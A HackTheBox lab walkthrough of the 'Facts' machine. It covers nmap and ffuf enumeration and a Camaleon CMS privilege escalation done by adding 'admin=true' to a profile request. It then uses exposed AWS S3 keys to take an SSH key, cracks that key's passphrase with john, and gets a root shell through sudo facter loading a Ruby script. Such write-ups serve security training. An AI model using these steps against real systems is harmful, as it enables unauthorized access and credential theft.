---
categories:
- Hackthebox
image:
  path: facts.png
layout: post
media_subpath: /assets/images/facts
tags:
- hackthebox
- writeup
- linux
- ruby
- cms
- camaleon-cms
- aws
- s3
- ssh
- facter
- privilege-escalation
- medium
title: HTB - Facts Walkthrough
---





## Introduction

Facts is a medium-difficulty Linux machine that demonstrates multiple security issues in web applications and misconfigured services. The attack path involves exploiting a privilege escalation vulnerability in Camaleon CMS, accessing exposed AWS S3 credentials, and leveraging insecure sudo permissions on the Facter utility to achieve root access.
## Reconnaissance
### Port Scanning
Initial reconnaissance with `nmap` reveals two open services.
```
nmap -sCV -oA nmap/facts 10.129.244.96     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 08:06 +0300
Nmap scan report for 10.129.244.96
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.75 seconds
```
**Key Findings:**
- **Port 22**: SSH (OpenSSH 9.9)
- **Port 80**: HTTP (nginx 1.26.3)
- **Hostname**: `facts.htb`
Added the domain to the hosts file:
```
echo '10.129.244.96 facts.htb' | sudo tee -a /etc/hosts
```
## Initial Access
### Web Application Analysis
The website appears to be running a content management system. HTTP headers reveal it's using Camaleon CMS.
```
curl http://facts.htb/ -I                                                                                                    
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Tue, 10 Feb 2026 05:12:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
link: </assets/themes/camaleon_first/assets/css/main-41052d2acf5add707cadf8d1c12a89a9daca83fb8178fdd5c9105dc6c566d25d.css>; rel=preload; as=style; nopush,</assets/themes/camaleon_first/assets/js/main-2d9adb006939c9873a62dff797c5fc28dff961487a2bb550824c5bc6b8dbb881.js>; rel=preload; as=script; nopush
vary: Accept
etag: W/"702d2248e3cbf260befb8b5976697244"
cache-control: max-age=0, private, must-revalidate
set-cookie: _factsapp_session=mSCMkCsRSgIjfpquTWrsgRohBHnekBcavOc2AYkiexscA1MmFbUyThe4kxKkjuHaUEJqZAEHimxWHjEm23G9lhImGGMf%2FgbDATJ4PBJgbO3XKFk2x1Tn1%2Ff4pOLoq3Kc2yzyJHZ4dou%2F3ZeW7zJ%2F%2B2S4qYDZsMwKXm4lTeoHPeIYY9Z0fFVT9iAHSWhr5Kca%2BqNutVm1yUKtwguEVW519VUx7TZaSYLMha4G5ksEto4muvIYzB7Y%2Fx4Kfv1m0UiRIQlf7aHhWLCl9M9MHmib3i3hI6NK6fJ7RA%3D%3D--EC84wbvV4ZTprUn4--9cAes6rzIvDjhGuzFMX34w%3D%3D; path=/; httponly; samesite=lax
x-request-id: f101169f-69de-449d-a5cb-26c9408fa6ec
x-runtime: 0.042112
```

Directory enumeration with `ffuf` uncovers several endpoints, including an admin panel.
```
ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 232ms]
                        [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 236ms]
rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 358ms]
sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 965ms]
search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 1390ms]
en                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 1647ms]
page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 1664ms]
welcome                 [Status: 200, Size: 11966, Words: 1481, Lines: 130, Duration: 2005ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1966ms]
post                    [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 2251ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2154ms]
up                      [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 2051ms]
-                       [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 2233ms]
404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 1615ms]
robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 2252ms]
400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 2202ms]
error                   [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 2172ms]
500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 1807ms]
422                     [Status: 200, Size: 8380, Words: 1063, Lines: 115, Duration: 2120ms]
captcha                 [Status: 200, Size: 4801, Words: 24, Lines: 14, Duration: 2830ms]
                        [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 2442ms
```
### Camaleon CMS Authentication Bypass
The `/admin` endpoint redirects to a login page.

![img](Pasted image 20260210144659.png)

After registering a standard user account and logging in, I discovered a profile management page where users can change their password.
![img](Pasted image 20260210150029.png)
#### Exploiting Insecure Parameter Handling
The password change functionality was vulnerable to parameter tampering. By intercepting the request in Burp Suite and adding an `admin: true` parameter, I was able to escalate my privileges to administrator.
**Original Request:**
```
POST /admin/save_profile HTTP/1.1
...
current_password=userpass&password=newpass&confirm_password=newpass
```
**Modified Request:**
```
POST /admin/save_profile HTTP/1.1
...
current_password=userpass&password=newpass&confirm_password=newpass&admin=true
```
![img](Pasted image 20260210151322.png)
After forwarding the modified request, the application granted administrator access.
![img](Pasted image 20260210151414.png)

### AWS Credential Discovery
As an administrator, exploring the settings revealed hardcoded AWS credentials configured for S3 integration.
![img](Pasted image 20260210172612.png)
**Credentials Found:**
- **Access Key ID**: `AKIA8CC93B05C96D98E8`
- **Secret Access Key**: `g5RLd+ol9SOBC1phuVxZKkp0ry9PDOnenomnD8UM`
- **Endpoint**: `http://facts.htb:54321`
- **Region**: `us-east-1`

## Lateral Movement

### S3 Bucket Enumeration

Configuring `awscli` with the discovered credentials allowed access to the internal S3 service
```
aws configure                                  
AWS Access Key ID [None]: AKIA8CC93B05C96D98E8
AWS Secret Access Key [None]: g5RLd+ol9SOBC1phuVxZKkp0ry9PDOnenomnD8UM
Default region name [None]: us-east-1
Default output format [None]: 
```
Listing available buckets revealed two: `internal` and `randomfacts`.
```
aws --endpoint-url http://facts.htb:54321 s3 ls
2025-09-11 15:06:52 internal
2025-09-11 15:06:52 randomfacts
```
### SSH Key Extraction
The `internal` bucket contained user home directory files, including SSH keys.
```
aws --endpoint-url http://facts.htb:54321 s3 ls internal/.ssh/
2026-02-10 16:37:12         82 authorized_keys
2026-02-10 16:37:12        464 id_ed25519
```
Downloading the private key:
```
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519          
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519           
```
### SSH Key Cracking
The private key was protected with a passphrase, which was cracked using `john`.
```
ssh2john id_ed25519 > hashes/hash
john hashes/hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:02:53 DONE (2026-02-10 17:52) 0.005777g/s 18.48p/s 18.48c/s 18.48C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
**Cracked Passphrase**: `dragonballz`
### SSH Access
With the cracked passphrase, SSH access was obtained as the `trivia` user.
```
chmod 600 id_ed25519
ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519": 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMdiw4bbNUfVfSQVonU+OFWjFiYjRGJuG6cxpmoRieGc trivia@facts.htb

ssh -i id_ed25519 trivia@facts.htb
The authenticity of host 'facts.htb (10.129.15.118)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ed25519': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Feb 10 02:55:50 PM UTC 2026

  System load:           0.0
  Usage of /:            71.7% of 7.28GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.15.118
  IPv6 address for eth0: dead:beef::250:56ff:fe94:400a


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ 
```
The user flag was located at `/home/william/user.txt`.
## Privilege Escalation
### Sudo Permissions Analysis

The `trivia` user had permission to run `facter` as root without a password.
```
trivia@facts:/tmp$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
trivia@facts:/tmp$
```
### Facter Exploitation

Facter is a Ruby-based system profiling tool that can load custom Ruby scripts from specified directories. The `--custom-dir` option allows execution of arbitrary Ruby code.

**1. Create a malicious Ruby script:**

```
# /tmp/root.rb
exec "/bin/sh"

```

**2. Execute facter with the custom directory:**

```
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir /tmp
# id
uid=0(root) gid=0(root) groups=0(root)

```
The script executed with root privileges, providing a root shell. The root flag was located at `/root/root.txt`.

